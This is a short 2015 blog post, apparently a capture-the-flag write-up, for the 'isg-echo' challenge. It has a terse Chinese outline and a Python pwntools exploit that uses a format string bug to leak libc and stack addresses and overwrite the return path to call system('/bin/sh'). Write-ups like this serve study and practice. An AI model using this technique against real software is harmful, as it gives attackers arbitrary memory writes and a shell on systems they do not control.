---  
layout: post  
title: "isg-echo"  
date: 2015-10-20 16:59:07 +0800  
comments: true  
categories:   
---  
###0x00 分析  
格式化字符串漏洞  
先构造任意地址读函数  
再构造任意地址写函数  
在构造任意地址写时，对于小的数字可以采用以下方法  
最后ROP得到shell  
  
###0x01 exp  
  
	from pwn import *  
	from binascii import *  
  
  
	p = process('./echo')  
	#p = remote('127.0.0.1', 6666)  
  
  
	def write(addr, cont):  
		if u8(cont)<= 0xa:  
			print 'small'  
			print u8(cont)  
			payload  = ''  
			payload += 'a'*u8(cont)  
			payload += '%13$hhn'  
			payload  = payload.ljust(2+0x16, 'a')  
			payload += p32(addr)  
			p.recvuntil('age: ')  
			p.sendline(payload)  
		else:	  
			payload  = ''  
			payload += '%'+'0'*(0xe - len(str(u8(cont)))) + str(u8(cont))+'d'  
			#payload += '%13$paaa'  
			payload += '%13$hhna'  
			payload  = payload.ljust(16, 'b')  
			payload += p32(addr)  
			p.recvuntil('age: ')  
			p.sendline(payload)  
  
	def write4(addr, cont):  
		write(addr, cont[0:1])  
		write(addr+1, cont[1:2])  
		write(addr+2, cont[2:3])  
		write(addr+3, cont[3:4])  
  
  
	def leak_addr(n):  
		payload  = ''  
		payload += '%'+str(n)+'$p'  
		print p.recvuntil('age: ')  
		p.sendline(payload)  
		data = p.recv(10)  
		return int(data, 16)  
  
  
  
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')  
  
	a = leak_addr(15)  
	base = a - 0x38c   
	log.info('base:' + hex(base))  
	puts_plt = base + 0x600  
	main = base + 0x79b  
	popebp_ret = base + 0x000006a9  
	a = leak_addr(17)  
	stack_main = 0x40803698 - 0x408036d4 + a  
	log.info('stack_main:' + hex(stack_main))  
	a = leak_addr(43)  
	libc_base = a - 222 - libc.symbols['__libc_start_main']  
	log.info('libc_base:' + hex(libc_base))  
	system = libc_base + libc.symbols['system']  
	ite = libc.search('/bin/sh')  
	binsh = ite.next() + libc_base  
	log.info('system'+hex(system))  
	log.info('binsh'+hex(binsh))  
  
	def over():  
		payload  = ''  
		payload += p32(stack_main)		#ebp  
		payload += p32(system)  
		payload += p32(main)  
		payload += p32(binsh)  
		write4(stack_main, payload[0:4])  
		write4(stack_main+4, payload[4:8])  
		write4(stack_main+8, payload[8:12])  
		write4(stack_main+12, payload[12:16])  
  
	over()  
	p.interactive()  
  
